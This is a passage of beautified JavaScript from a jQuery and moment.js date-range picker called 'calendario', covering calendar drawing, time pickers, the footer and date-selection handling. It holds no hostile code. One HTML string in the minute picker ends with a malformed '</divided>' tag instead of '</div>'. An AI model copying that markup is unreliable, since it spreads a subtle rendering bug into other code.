            this.config.target.val("")) : (this.config.singleDate,
            this.config.target.text("")),
            this.config.startDate = null,
            this.config.endDate = null,
            this.globals.startDateInitial = null,
            this.globals.endDateInitial = null,
            e ? (this.config.startEmpty = !0,
            this.globals.firstValueSelected = !1) : 1 == this.config.startEmpty && (this.globals.firstValueSelected = !1),
            this.globals.initComplete) {
                this.updateHeader();
                var t = void 0 === this.footer ? [] : this.footer.find(".calendario-apply");
                0 < t.length && t.attr("disabled", "disabled")
            }
        },
        drawArrows: function() {
            var e = this.config.hideOutOfRange && this.config.minDate && this.globals.currentDate.clone().add(-1, "month").isBefore(this.config.minDate, "month")
              , t = this.config.hideOutOfRange && this.config.maxDate && this.globals.currentDate.clone().add(this.config.calendarCount, "month").isAfter(this.config.maxDate, "month");
            0 < this.container.find(".calendario-title").length && (this.globals.isMobile ? (e || this.container.find(".calendario-title").prepend("<div class='calendario-prev'>" + this.config.prevMonthIcon + "</div>"),
            t || this.container.find(".calendario-title").append("<div class='calendario-next'>" + this.config.nextMonthIcon + "</div>")) : (e || this.container.find(".calendario-title").first().prepend("<div class='calendario-prev'>" + this.config.prevMonthIcon + "</div>"),
            t || this.container.find(".calendario-title").last().append("<div class='calendario-next'>" + this.config.nextMonthIcon + "</div>")))
        },
        drawCalendarOfMonth: function(e) {
            e.locale(this.config.locale);
            var t = moment(e).locale(this.config.locale).startOf("month").startOf("isoweek").middleOfDay()
              , n = t.day();
            1 == n && !1 === this.config.startOnMonday ? (t.subtract(1, "days"),
            n = 0) : 0 === n && !0 === this.config.startOnMonday && (t.add(1, "days"),
            n = 1),
            t.isAfter(moment(e).date(1)) && t.add(-7, "day");
            var i = "<div class='calendario-calendar" + (this.config.showWeekNumbers ? " calendario-calendar-weeknumbers" : "") + "' data-month='" + e.month() + "'>"
              , a = 0
              , s = ""
              , r = "";
            this.config.enableMonthSwitcher && (s = " class='calendario-month-switch'"),
            this.config.enableYearSwitcher && (r = " class='calendario-year-switch'"),
            i += "<div class='calendario-title'><span><b" + s + ">" + e.format("MMMM") + "</b>&nbsp;<span" + r + ">" + this.localizeNumbers(e.year()) + "</span></span></div>",
            i += "<div class='calendario-days-container'>",
            this.config.showWeekNumbers && (i += "<div class='calendario-dayofweek'>&nbsp;</div>");
            for (var o = n; o < n + 7; o++)
                i += "<div class='calendario-dayofweek'>" + moment().day(o % 7).locale(this.config.locale).format("ddd") + "</div>";
            for (var l = t.clone().add(-24, "hours").middleOfDay(), d = l.unix(), u = this.isDisabledOnDraw(l); a < 42; ) {
                var c = t.middleOfDay().unix()
                  , h = e.month() == t.month() ? "calendario-day" : "calendario-disabled";
                a % 7 == 0 && this.config.showWeekNumbers && (i += "<div class='calendario-weeknumber'><span>" + t.format("ww") + "</span></div>"),
                i += "<div class='" + h + "' data-value='" + c + "'><span>" + this.localizeNumbers(t.date()) + "</span></div>",
                this.isDisabledOnDraw(t) ? (this.globals.disabledDays[c] = 1 == u ? 2 : 1,
                u = !0,
                d = c) : (1 == u && null != d && (this.globals.disabledDays[d] = 3),
                u = !1),
                t.add(moment.duration({
                    days: 1
                })),
                a++
            }
            i += "</div>",
            i += "</div>",
            this.calendars.append(i)
        },
        drawTimePickers: function() {
            this.input.find(".calendario-timepickers").remove(),
            this.input.append("<div class='calendario-timepickers'></div>"),
            this.timepickers = this.input.find(".calendario-timepickers"),
            this.config.showTimePickers || this.timepickers.hide();
            var e = 0
              , t = 23
              , n = !1;
            12 == this.config.hourFormat && (e = 1,
            t = 12,
            n = !0);
            var i = g("<div class='calendario-timepicker calendario-timepicker-start'></div>").appendTo(this.timepickers);
            this.addTimePickerHours(i, e, t),
            this.addTimePickerHourMinuteSeparator(i),
            this.addTimePickerMinutes(i, this.config.minuteSteps, 0, 59),
            n && this.addTimePickerAMPM(i),
            !1 === this.config.singleDate && (i = g("<div class='calendario-timepicker calendario-timepicker-end'></div>").appendTo(this.timepickers),
            this.addTimePickerHours(i, e, t),
            this.addTimePickerHourMinuteSeparator(i),
            this.addTimePickerMinutes(i, this.config.minuteSteps, 0, 59),
            n && this.addTimePickerAMPM(i)),
            this.addTimePickerEvents(),
            this.updateTimePickerDisplay()
        },
        addTimePickerHours: function(e, t, n) {
            e[0].classList.contains("calendario-timepicker-start");
            var i = g("<div class='calendario-timepicker-hours-wrapper' tabindex='0'></div>").appendTo(e)
              , a = g("<div class='calendario-timepicker-hours'></div>").appendTo(i)
              , s = "<div class='calendario-hour-selected-prev'>&nbsp;</div>";
            s += "<div class='calendario-hour-selected'>" + ("00" + t).slice(-2) + "</div>",
            s += "<div class='calendario-hour-selected-next'>" + ("00" + (t + 1)).slice(-2) + "</div>",
            a.append(s).data({
                value: t,
                min: t,
                max: n,
                step: 1
            }),
            g("<div class='calendario-timepicker-hour-arrows'><div class='calendario-timepicker-hours-up " + (this.config.reverseTimepickerArrows ? "calendario-direction-down" : "calendario-direction-up") + "'><i class='fa fa-arrow-up'></i></div><div class='calendario-timepicker-hours-down " + (this.config.reverseTimepickerArrows ? "calendario-direction-up" : "calendario-direction-down") + "'><i class='fa fa-arrow-down'></i></div></div>").appendTo(e)
        },
        addTimePickerMinutes: function(e, t, n, i) {
            e[0].classList.contains("calendario-timepicker-start");
            var a = g("<div class='calendario-timepicker-minutes-wrapper' tabindex='0'></div>").appendTo(e);
            g("<div class='calendario-timepicker-minutes'></div>").appendTo(a).append("<div class='calendario-minute-selected-prev'>&nbsp;</div><div class='calendario-minute-selected'>00</div><div class='calendario-minute-selected-next'>01</divided>").data({
                value: n,
                min: n,
                max: i % t != 0 ? i - i % t : i,
                step: t
            }),
            g("<div class='calendario-timepicker-minute-arrows'><div class='calendario-timepicker-minutes-up " + (this.config.reverseTimepickerArrows ? "calendario-direction-down" : "calendario-direction-up") + "'><i class='fa fa-arrow-up'></i></div><div class='calendario-timepicker-minutes-down " + (this.config.reverseTimepickerArrows ? "calendario-direction-up" : "calendario-direction-down") + "'><i class='fa fa-arrow-down'></i></div></div>").appendTo(e)
        },
        addTimePickerHourMinuteSeparator: function(e) {
            g("<div class='calendario-hour-minute-seperator'>:</div>").appendTo(e)
        },
        addTimePickerAMPM: function(e) {
            e[0].classList.contains("calendario-timepicker-start");
            var t = g("<div class='calendario-timepicker-ampm' tabindex='0'></div>").appendTo(e);
            t.append("<div class='calendario-timepicker-ampm-am'>" + this.localizeAMPM("AM") + "</div>"),
            t.append("<div class='calendario-timepicker-ampm-pm'>" + this.localizeAMPM("PM") + "</div>")
        },
        addTimePickerEvents: function() {
            function n(e) {
                var t = e.parents(".calendario-container, .calendario-container-mobile").first().data("calendario")
                  , n = e.parents(".calendario-timepicker").attr("class")
                  , i = e.attr("class")
                  , a = 0 <= n.indexOf("calendario-timepicker-start") ? "start" : "end"
                  , s = 0 < i.indexOf("timepicker-minutes") ? "minute" : "hour"
                  , r = 0 <= i.indexOf("calendario-direction-up") ? "up" : "down";
                if (null !== t.config[a + "Date"]) {
                    var o = "hour" == s ? 1 : t.config.minuteSteps
                      , l = t.config[a + "Date"]
                      , d = l.clone().add(!1 === t.config.reverseTimepickerArrows ? "up" == r ? -1 * o : o : "down" == r ? o : -1 * o, s);
                    d.set({
                        date: l.date(),
                        month: l.month(),
                        year: l.year()
                    });
                    var u = t.TimeInsideLimits(d, l);
                    t.config[a + "Date"] = u.clone(),
                    t.updateTimePickerDisplay(),
                    t.updateInput(!1, !0)
                }
            }
            var i = this;
            g(o).off("mousedown.calendario").on("mousedown.calendario", ".calendario-timepicker-minutes-up, .calendario-timepicker-minutes-down, .calendario-timepicker-hours-up, .calendario-timepicker-hours-down", function(e) {
                var t = this;
                i.globals.mouseTimer && clearInterval(i.globals.mouseTimer),
                n(g(t)),
                i.globals.mouseTimer = setInterval(function() {
                    n(g(t))
                }, 200)
            }).off("mouseup.calendario").on("mouseup.calendario", function(e) {
                i.globals.mouseTimer && clearInterval(i.globals.mouseTimer),
                i.globals.preventMouseClick = !0
            }).off("click.calendario").on("click.calendario", ".calendario-timepicker-minutes-up, .calendario-timepicker-minutes-down, .calendario-timepicker-hours-up, .calendario-timepicker-hours-down", function(e) {
                i.globals.preventMouseClick || n(g(this)),
                i.globals.preventMouseClick = !1
            }),
            this.timepickers.find(".calendario-timepicker-hours-wrapper, .calendario-timepicker-minutes-wrapper").off("mousewheel.calendario DOMMouseScroll.calendario").on("mousewheel.calendario DOMMouseScroll.calendario", function(e) {
                0 < (e.originalEvent.wheelDelta || -e.originalEvent.detail) / 120 ? g(e.currentTarget).hasClass("calendario-timepicker-hours-wrapper") ? n(g(this).siblings(".calendario-timepicker-hour-arrows").find(".calendario-timepicker-hours-up")) : g(e.currentTarget).hasClass("calendario-timepicker-minutes-wrapper") && n(g(this).siblings(".calendario-timepicker-minute-arrows").find(".calendario-timepicker-minutes-up")) : g(e.currentTarget).hasClass("calendario-timepicker-hours-wrapper") ? n(g(this).siblings(".calendario-timepicker-hour-arrows").find(".calendario-timepicker-hours-down")) : g(e.currentTarget).hasClass("calendario-timepicker-minutes-wrapper") && n(g(this).siblings(".calendario-timepicker-minute-arrows").find(".calendario-timepicker-minutes-down")),
                i.stopBubbling(e)
            }),
            this.globals.isMobile && this.timepickers.find(".calendario-timepicker-minutes, .calendario-timepicker-hours").each(function() {
                var e = new Hammer(this);
                e.get("pan").set({
                    direction: Hammer.DIRECTION_VERTICAL
                }),
                e.on("panmove", i.panThrottle(function(e) {
                    var t = g(e.target);
                    return 0 < e.velocityY ? t.hasClass("calendario-timepicker-hours-wrapper") || 0 < t.parents(".calendario-timepicker-hours-wrapper").length ? (n(t.parents(".calendario-timepicker").find(".calendario-timepicker-hours-up")),
                    i.stopBubbling(e.srcEvent)) : (t.hasClass("calendario-timepicker-minutes-wrapper") || 0 < t.parents(".calendario-timepicker-minutes-wrapper").length) && (n(t.parents(".calendario-timepicker").find(".calendario-timepicker-minutes-up")),
                    i.stopBubbling(e.srcEvent)) : t.hasClass("calendario-timepicker-hours-wrapper") || 0 < t.parents(".calendario-timepicker-hours-wrapper").length ? (n(t.parents(".calendario-timepicker").find(".calendario-timepicker-hours-down")),
                    i.stopBubbling(e.srcEvent)) : (t.hasClass("calendario-timepicker-minutes-wrapper") || 0 < t.parents(".calendario-timepicker-minutes-wrapper").length) && (n(t.parents(".calendario-timepicker").find(".calendario-timepicker-minutes-down")),
                    i.stopBubbling(e.srcEvent)),
                    !1
                }))
            }),
            this.timepickers.find(".calendario-timepicker-ampm > div").off("click.calendario").on("click.calendario", function() {
                var e;
                if (g(this).hasClass("calendario-ampm-selected"))
                    return !1;
                g(this).addClass("calendario-ampm-selected").siblings().removeClass("calendario-ampm-selected"),
                i.updateInput(!1, !1),
                i.config.startDate && (e = i.config.startDate.clone(),
                i.config.startDate = i.TimeInsideLimits(i.config.startDate, "start"),
                !1 === i.config.startDate.isSame(e) && i.updateTimePickerDisplay()),
                i.config.endDate && (e = i.config.endDate.clone(),
                i.config.endDate = i.TimeInsideLimits(i.config.endDate, "end"),
                !1 === i.config.endDate.isSame(e) && i.updateTimePickerDisplay()),
                i.updateInput(!1, !0),
                i.config.ondraw(i)
            })
        },
        panThrottle: function(n) {
            return g.proxy(function() {
                var e = Array.prototype.slice.call(arguments)
                  , t = Math.ceil(Math.abs(e[0].deltaY) / 20) || 1;
                this.globals.panScrollPos != t && (n.apply(this, e),
                this.globals.panScrollPos = t)
            }, this)
        },
        readTimeFromDisplay: function(e) {
            var t = null
              , n = null
              , i = ""
              , a = "";
            12 == this.config.hourFormat ? (i = this.timepickers.find(".calendario-timepicker-start .calendario-hour-selected").text() + " " + this.timepickers.find(".calendario-timepicker-start .calendario-minute-selected").text() + " " + this.timepickers.find(".calendario-timepicker-start .calendario-ampm-selected").text(),
            t = moment(i, "hh mm a", this.config.locale),
            !1 === this.config.singleDate && (a = this.timepickers.find(".calendario-timepicker-end .calendario-hour-selected").text() + " " + this.timepickers.find(".calendario-timepicker-end .calendario-minute-selected").text() + " " + this.timepickers.find(".calendario-timepicker-end .calendario-ampm-selected").text(),
            n = moment(a, "hh mm a", this.config.locale))) : (i = this.timepickers.find(".calendario-timepicker-start .calendario-hour-selected").text() + " " + this.timepickers.find(".calendario-timepicker-start .calendario-minute-selected").text(),
            t = moment(i, "HH mm", this.config.locale),
            !1 === this.config.singleDate && (a = this.timepickers.find(".calendario-timepicker-end .calendario-hour-selected").text() + " " + this.timepickers.find(".calendario-timepicker-end .calendario-minute-selected").text(),
            n = moment(a, "HH mm", this.config.locale))),
            t.isValid() && null !== this.config.startDate && this.config.startDate.hours(t.hours()).minutes(t.minutes()).locale(this.config.locale),
            !1 === this.config.singleDate && n.isValid() && null !== this.config.endDate && this.config.endDate.hours(n.hours()).minutes(n.minutes()).locale(this.config.locale),
            e && (t && (this.globals.startTimeBackup = t.clone()),
            n && !1 === this.config.singleDate && (this.globals.endTimeBackup = n.clone()))
        },
        backupTimePickers: function() {
            this.readTimeFromDisplay(!0)
        },
        restoreTimePickers: function() {
            12 == this.config.hourFormat ? (this.globals.startTimeBackup && this.setStartTimeValue(parseInt(this.globals.startTimeBackup.clone().locale("en").format("hh"), 10), parseInt(this.globals.startTimeBackup.clone().locale("en").format("mm"), 10), this.globals.startTimeBackup.clone().locale("en").format("a")),
            !this.config.singleDate && this.globals.endTimeBackup && this.setEndTimeValue(parseInt(this.globals.endTimeBackup.clone().locale("en").format("hh"), 10), parseInt(this.globals.endTimeBackup.clone().locale("en").format("mm"), 10), this.globals.endTimeBackup.clone().locale("en").format("a"))) : (this.globals.startTimeBackup && this.setStartTimeValue(parseInt(this.globals.startTimeBackup.clone().locale("en").format("HH"), 10), parseInt(this.globals.startTimeBackup.clone().locale("en").format("mm"), 10), null),
            !this.config.singleDate && this.globals.endTimeBackup && this.setEndTimeValue(parseInt(this.globals.endTimeBackup.clone().locale("en").format("HH"), 10), parseInt(this.globals.endTimeBackup.clone().locale("en").format("mm"), 10), null))
        },
        updateTimePickerDisplay: function() {
            if (this.timepickers !== u) {
                if (null !== this.config.startDate) {
                    var e = this.config.startDate.clone().locale("en").set({
                        minute: 1 != this.config.minuteSteps ? Math.round(this.config.startDate.minutes() / this.config.minuteSteps) * this.config.minuteSteps : this.config.startDate.minutes()
                    })
                      , t = e.hours()
                      , n = e.minutes()
                      , i = null;
                    if (12 == this.config.hourFormat) {
                        var a = e.format("hh mm a").split(" ");
                        t = parseInt(a[0], 10),
                        i = a[2].toLowerCase()
                    }
                    this.setStartTimeValue(t, n, i)
                }
                if (null !== this.config.endDate) {
                    var s = this.config.endDate.clone().locale("en").set({
                        minute: 1 != this.config.minuteSteps ? Math.round(this.config.endDate.minutes() / this.config.minuteSteps) * this.config.minuteSteps : this.config.endDate.minutes()
                    })
                      , r = s.hours()
                      , o = s.minutes()
                      , l = null;
                    if (12 == this.config.hourFormat) {
                        var d = s.format("hh mm a").split(" ");
                        r = parseInt(d[0], 10),
                        l = d[2].toLowerCase()
                    }
                    this.setEndTimeValue(r, o, l)
                }
            }
            this.TimePickerOutOfLimitView()
        },
        setStartTimeValue: function(e, t, n) {
            var i = 12 == this.config.hourFormat && this.config.dontPrefixHours ? "  " : "00"
              , a = this.timepickers.find(".calendario-timepicker-start")
              , s = a.find(".calendario-timepicker-hours");
            s.data("value", e);
            var r = s.data();
            r && r.hasOwnProperty("value") && (s.find(".calendario-hour-selected").text(this.localizeNumbers((i + r.value).slice(-2))),
            s.find(this.config.reverseTimepickerArrows ? ".calendario-hour-selected-next" : ".calendario-hour-selected-prev").text(this.localizeNumbers(r.value - r.step < r.min ? (i + r.max).slice(-2) : (i + (r.value - r.step)).slice(-2))),
            s.find(this.config.reverseTimepickerArrows ? ".calendario-hour-selected-prev" : ".calendario-hour-selected-next").text(this.localizeNumbers(r.value + r.step > r.max ? (i + r.min).slice(-2) : (i + (r.value + r.step)).slice(-2))));
            var o = a.find(".calendario-timepicker-minutes");
            o.data("value", t),
            (r = o.data()) && r.hasOwnProperty("value") && (o.find(".calendario-minute-selected").text(this.localizeNumbers(("00" + r.value).slice(-2))),
            o.find(this.config.reverseTimepickerArrows ? ".calendario-minute-selected-next" : ".calendario-minute-selected-prev").text(this.localizeNumbers(r.value - r.step < r.min ? ("00" + r.max).slice(-2) : ("00" + (r.value - r.step)).slice(-2))),
            o.find(this.config.reverseTimepickerArrows ? ".calendario-minute-selected-prev" : ".calendario-minute-selected-next").text(this.localizeNumbers(r.value + r.step > r.max ? ("00" + r.min).slice(-2) : ("00" + (r.value + r.step)).slice(-2)))),
            null !== n && (a.find(".calendario-ampm-selected").removeClass("calendario-ampm-selected"),
            a.find(".calendario-timepicker-ampm-" + n).addClass("calendario-ampm-selected"))
        },
        localizeAMPM: function(e) {
            return moment("00:00 " + e, "HH:mm A").locale(this.config.locale).format("A")
        },
        localizeNumbers: function(e) {
            return moment.localeData(this.config.locale).postformat("" + e)
        },
        setEndTimeValue: function(e, t, n) {
            var i = 12 == this.config.hourFormat && this.config.dontPrefixHours ? "  " : "00"
              , a = this.timepickers.find(".calendario-timepicker-end")
              , s = a.find(".calendario-timepicker-hours");
            s.data("value", e);
            var r = s.data();
            r && r.hasOwnProperty("value") && (s.find(".calendario-hour-selected").text(this.localizeNumbers((i + r.value).slice(-2))),
            s.find(this.config.reverseTimepickerArrows ? ".calendario-hour-selected-next" : ".calendario-hour-selected-prev").text(this.localizeNumbers(r.value - r.step < r.min ? (i + r.max).slice(-2) : (i + (r.value - r.step)).slice(-2))),
            s.find(this.config.reverseTimepickerArrows ? ".calendario-hour-selected-prev" : ".calendario-hour-selected-next").text(this.localizeNumbers(r.value + r.step > r.max ? (i + r.min).slice(-2) : (i + (r.value + r.step)).slice(-2))));
            var o = a.find(".calendario-timepicker-minutes");
            o.data("value", t),
            (r = o.data()) && r.hasOwnProperty("value") && (o.find(".calendario-minute-selected").text(this.localizeNumbers(("00" + r.value).slice(-2))),
            o.find(this.config.reverseTimepickerArrows ? ".calendario-minute-selected-next" : ".calendario-minute-selected-prev").text(this.localizeNumbers(r.value - r.step < r.min ? ("00" + r.max).slice(-2) : ("00" + (r.value - r.step)).slice(-2))),
            o.find(this.config.reverseTimepickerArrows ? ".calendario-minute-selected-prev" : ".calendario-minute-selected-next").text(this.localizeNumbers(r.value + r.step > r.max ? ("00" + r.min).slice(-2) : ("00" + (r.value + r.step)).slice(-2)))),
            null !== n && (a.find(".calendario-ampm-selected").removeClass("calendario-ampm-selected"),
            a.find(".calendario-timepicker-ampm-" + n).addClass("calendario-ampm-selected"))
        },
        convertLimits: function(e) {
            var t = moment("00:00", "HH:mm")
              , n = moment("23:59", "HH:mm");
            return e.hasOwnProperty("start") && (t = e.start.hasOwnProperty("ampm") && "string" == typeof e.start.ampm && 0 <= ["am", "pm"].indexOf(e.start.ampm.toLowerCase()) ? moment(e.start.hour + ":" + e.start.minute + " " + e.start.ampm.toLowerCase(), "h:m a") : moment(e.start.hour + ":" + e.start.minute, "H m"),
            e.hasOwnProperty("end") && (n = e.end.hasOwnProperty("ampm") && "string" == typeof e.end.ampm && 0 <= ["am", "pm"].indexOf(e.end.ampm.toLowerCase()) ? moment(e.end.hour + ":" + e.end.minute + " " + e.end.ampm.toLowerCase(), "h:m a") : moment(e.end.hour + ":" + e.end.minute, "H m"))),
            {
                start: {
                    hour: t.hour(),
                    minute: t.minute()
                },
                end: {
                    hour: n.hour(),
                    minute: n.minute()
                }
            }
        },
        fixLimits: function(e) {
            var t, n = [{
                start: {
                    hour: 0,
                    minute: 0,
                    ampm: null
                },
                end: {
                    hour: 23,
                    minute: 59,
                    ampm: null
                }
            }];
            if (!e)
                return n;
            for (Array.isArray(e) || (e = [e]),
            l = 0,
            len = e.length; l < len; l++)
                if (0 == ("object" == typeof (t = e[l]) && t.hasOwnProperty("start") && t.hasOwnProperty("end") && t.start.hasOwnProperty("hour") && 0 == isNaN(t.start.hour) && t.start.hasOwnProperty("minute") && 0 == isNaN(t.start.minute) && t.start.hasOwnProperty("ampm") && ("am" == t.start.ampm || "pm" == t.start.ampm || null == t.start.ampm) && t.end.hasOwnProperty("hour") && 0 == isNaN(t.end.hour) && t.end.hasOwnProperty("minute") && 0 == isNaN(t.end.minute) && t.end.hasOwnProperty("ampm") && ("am" == t.end.ampm || "pm" == t.end.ampm || null == t.end.ampm)))
                    return n;
            return e
        },
        TimeInsideLimits: function(e, t) {
            direction = "undefined" == typeof direction ? "static" : direction;
            for (var n = this.fixLimits(this.config.limitTimeForDay(e)), i = [], a = 0, s = n.length; a < s; a++)
                if (i[a] = this.convertLimits(n[a]),
                i[a].startLimit = e.clone().hour(i[a].start.hour).minute(i[a].start.minute),
                i[a].endLimit = e.clone().hour(i[a].end.hour).minute(i[a].end.minute),
                e.isBetween(i[a].startLimit, i[a].endLimit, null, "[]"))
                    return e;
            if ("end" == t) {
                for (a = 0; a < s; a++)
                    if (i[a].startLimit.isAfter(e))
                        return i[a].startLimit;
                return i[0].startLimit
            }
            if (moment.isMoment(t)) {
                for (a = 0; a < s && !t.isBetween(i[a].startLimit, i[a].endLimit, null, "[]"); a++)
                    ;
                return t.isAfter(e) ? i[0 == a ? s - 1 : a - 1].endLimit : i[a == s - 1 ? 0 : a + 1].startLimit
            }
            for (a = 0; a < s; a++)
                if (i[a].endLimit.isBefore(e))
                    return i[a].endLimit;
            return i[s - 1].endLimit
        },
        TimePickerOutOfLimitView: function() {
            var e, t, n, i, a;
            this.config.startDate && this.timepickers && (e = this.config.startDate.clone(),
            n = this.convertLimits(this.config.limitTimeForDay(e.clone())),
            i = e.clone().hour(n.start.hour).minute(n.start.minute),
            a = e.clone().hour(n.end.hour).minute(n.end.minute),
            e.clone().add(1, "hour").isAfter(a, "hour") && this.timepickers.find(".calendario-timepicker-start .calendario-timepicker-hours .calendario-hour-selected-next").html("&nbsp;"),
            e.clone().add(-1, "hour").isBefore(i, "hour") && this.timepickers.find(".calendario-timepicker-start .calendario-timepicker-hours .calendario-hour-selected-prev").html("&nbsp;"),
            e.clone().add(1, "minute").isAfter(a, "minute") && this.timepickers.find(".calendario-timepicker-start .calendario-timepicker-minutes .calendario-minute-selected-next").html("&nbsp;"),
            e.clone().add(-1, "minute").isBefore(i, "minute") && this.timepickers.find(".calendario-timepicker-start .calendario-timepicker-minutes .calendario-minute-selected-prev").html("&nbsp;")),
            this.config.endDate && this.timepickers && (t = this.config.endDate.clone(),
            n = this.convertLimits(this.config.limitTimeForDay(t.clone())),
            i = t.clone().hour(n.start.hour).minute(n.start.minute),
            a = t.clone().hour(n.end.hour).minute(n.end.minute),
            t.clone().add(1, "hour").isAfter(a, "hour") && this.timepickers.find(".calendario-timepicker-end .calendario-timepicker-hours .calendario-hour-selected-next").html("&nbsp;"),
            t.clone().add(-1, "hour").isBefore(i, "hour") && this.timepickers.find(".calendario-timepicker-end .calendario-timepicker-hours .calendario-hour-selected-prev").html("&nbsp;"),
            t.clone().add(1, "minute").isAfter(a, "minute") && this.timepickers.find(".calendario-timepicker-end .calendario-timepicker-minutes .calendario-minute-selected-next").html("&nbsp;"),
            t.clone().add(-1, "minute").isBefore(i, "minute") && this.timepickers.find(".calendario-timepicker-end .calendario-timepicker-minutes .calendario-minute-selected-prev").html("&nbsp;"))
        },
        drawFooter: function() {
            if (!1 === this.config.singleDate && !0 === this.config.showFooter && !0 === this.config.showCalendars) {
                "horizontal" === this.config.rangeOrientation || this.globals.isMobile ? this.input.append("<div class='calendario-ranges'></div>") : (this.input.addClass("calendario-input-vertical-range"),
                this.input.wrapInner("<div class='calendario-left'></div>"),
                g("<div class='calendario-right' style='max-width: " + this.config.verticalRangeWidth + "px; min-width: " + this.config.verticalRangeWidth + "px'><div class='calendario-ranges'></div></div>").insertAfter(this.input.find(".calendario-left")));
                var e = this.input.find(".calendario-ranges");
                for (var t in e.append("<span class='calendario-range-header-container'>" + this.config.rangeIcon + "<div class='calendario-range-header'>" + this.config.rangeLabel + "</div></span>"),
                this.config.ranges)
                    e.append("<div class='calendario-range" + (this.config.ranges[t].selected ? " calendario-range-selected" : "") + "' data-id='" + t + "'>" + this.config.ranges[t].title + "</div>")
            }
            if (this.globals.isMobile && (!0 !== this.config.singleDate && !1 !== this.config.showFooter || this.input.append("<div class='calendario-filler'></div>")),
            (this.globals.isMobile && !this.config.inline || !this.globals.isMobile && !this.config.inline && this.config.showButtons) && ("horizontal" === this.config.rangeOrientation || this.globals.isMobile ? this.input.append("<div class='calendario-footer'></div>") : this.input.find(".calendario-right").append("<div class='calendario-footer'></div>"),
            this.footer = this.input.find(".calendario-footer"),
            this.footer.append("<button type='button' class='calendario-cancel'>" + this.config.cancelLabel + "</button>"),
            this.footer.append("<button type='button' class='calendario-apply'>" + this.config.applyLabel + "</button>"),
            !1 === this.globals.firstValueSelected && !0 === this.config.startEmpty && void 0 !== this.footer || this.globals.isMobile && !1 === this.globals.endSelected)) {
                var n = void 0 === this.footer ? [] : this.footer.find(".calendario-apply");
                0 < n.length && n.attr("disabled", "disabled")
            }
        },
        drawNextMonth: function(e) {
            if (e = e || r.event,
            1 == this.config.hideOutOfRange && this.config.maxDate && this.globals.currentDate.clone().add(this.config.calendarCount, "month").isAfter(this.config.maxDate, "month"))
                return !1;
            if (null === this.globals.swipeTimeout) {
                var t = this;
                this.globals.swipeTimeout = setTimeout(function() {
                    if (!0 === t.config.onbeforemonthchange(t, t.globals.currentDate ? t.globals.currentDate.clone().startOfMonth() : null, "next")) {
                        var e = t.calendars.get(0).scrollTop;
                        t.globals.currentDate.middleOfDay().add(1, "month"),
                        t.reDrawCalendars(),
                        t.calendars.get(0).scrollTop = e,
                        t.config.onaftermonthchange(t, t.globals.currentDate ? t.globals.currentDate.clone().startOfMonth() : null)
                    }
                    t.globals.swipeTimeout = null
                }, "click" == e.type ? 0 : 100)
            }
            this.stopBubbling(e)
        },
        drawPrevMonth: function(e) {
            if (e = e || r.event,
            1 == this.config.hideOutOfRange && this.config.minDate && this.globals.currentDate.clone().add(-1, "month").isBefore(this.config.minDate, "month"))
                return !1;
            if (null === this.globals.swipeTimeout) {
                var t = this;
                this.globals.swipeTimeout = setTimeout(function() {
                    if (!0 === t.config.onbeforemonthchange(t, t.globals.currentDate ? t.globals.currentDate.clone().startOfMonth() : null, "prev")) {
                        var e = t.calendars.get(0).scrollTop;
                        t.globals.currentDate.middleOfDay().subtract(1, "month"),
                        t.reDrawCalendars(),
                        t.calendars.get(0).scrollTop = e,
                        t.config.onaftermonthchange(t, t.globals.currentDate ? t.globals.currentDate.clone().startOfMonth() : null)
                    }
                    t.globals.swipeTimeout = null
                }, 100)
            }
            this.stopBubbling(e)
        },
        cellClicked: function(e) {
            (e = e || r.event).target = e.target || e.srcElement,
            !1 === g(e.target).hasClass("calendario-day") && (e.target = g(e.target).closest(".calendario-day").get(0));
            var t = g(e.target).data("value")
              , n = moment.unix(t).middleOfDay();
            if (0 == this.config.validateClick(n))
                return !1;
            if (!1 === this.config.singleDate)
                if (!1 === this.globals.startSelected) {
                    null !== this.config.startDate && (this.globals.startDateBackup = this.config.startDate.clone()),
                    this.config.startDate = n.clone(),
                    this.config.endDate = null,
                    this.globals.startSelected = !0,
                    this.globals.endSelected = !1,
                    this.readTimeFromDisplay(!1),
                    n = this.config.startDate.clone(),
                    this.config.startDate = this.TimeInsideLimits(this.config.startDate, "start"),
                    !1 === this.config.startDate.isSame(n) && this.updateTimePickerDisplay();
                    var i = void 0 === this.footer ? [] : this.footer.find(".calendario-apply");
                    0 < i.length && i.attr("disabled", "disabled"),
                    this.config.onfirstselect(this, this.config.startDate.clone())
                } else {
                    if (n.isBefore(this.config.startDate)) {
                        var a = this.config.startDate.clone();
                        this.config.startDate = n.clone(),
                        n = a
                    }
                    n.diff(this.config.startDate, "day") < this.config.minSelectedDays ? (this.globals.startSelected = !1,
                    this.fetchInputs()) : (this.globals.startDateBackup = null,
                    this.config.endDate = n.clone(),
                    this.globals.endSelected = !0,
                    this.globals.startSelected = !1,
                    this.globals.hoverDate = null,
                    this.readTimeFromDisplay(!1),
                    n = this.config.endDate.clone(),
                    this.config.endDate = this.TimeInsideLimits(this.config.endDate, "end"),
                    !1 === this.config.endDate.isSame(n) && this.updateTimePickerDisplay(),
                    !0 === this.config.onbeforeselect(this, this.config.startDate ? this.config.startDate.clone() : null, this.config.endDate ? this.config.endDate.clone() : null) && !0 === this.checkRangeContinuity() ? (this.globals.firstValueSelected = !0,
                    this.clearRangeSelection(),
                    this.updateInput(!0, !1)) : this.fetchInputs(),
                    this.config.autoCloseOnSelect && !1 === this.config.inline ? this.hideDropdown(e) : void 0 !== this.footer && null !== this.config.endDate && this.footer.find(".calendario-apply").removeAttr("disabled"))
                }
            else
                this.config.startDate = n.clone(),
                this.config.endDate = this.config.startDate.clone(),
                this.globals.endSelected = !0,
                this.globals.startSelected = !1,
                this.globals.hoverDate = null,
                this.readTimeFromDisplay(),
                n = this.config.startDate.clone(),
                this.config.startDate = this.TimeInsideLimits(this.config.startDate, "start"),
                !1 === this.config.startDate.isSame(n) && this.updateTimePickerDisplay(),
                !0 === this.config.onbeforeselect(this, this.config.startDate ? this.config.startDate.clone() : null, this.config.endDate ? this.config.endDate.clone() : null) ? (this.globals.firstValueSelected = !0,
                this.clearRangeSelection(),
                this.updateInput(!0, !1)) : this.fetchInputs(),
                this.config.autoCloseOnSelect && !1 === this.config.inline ? this.hideDropdown(e) : void 0 !== this.footer && null !== this.config.endDate && this.footer.find(".calendario-apply").removeAttr("disabled");
            return this.input.is(":visible") && (this.reDrawCells(),
            this.updateHeader()),
            this.stopBubbling(e),
            !1
        },
        checkRangeContinuity: function() {
            var e = this.config.endDate.diff(this.config.startDate, "days");
            if (this.config.singleDate || 0 == e)
                return !0;
            var t = moment(this.config.startDate).middleOfDay();
            if (1 == this.config.disableOnlyStart)
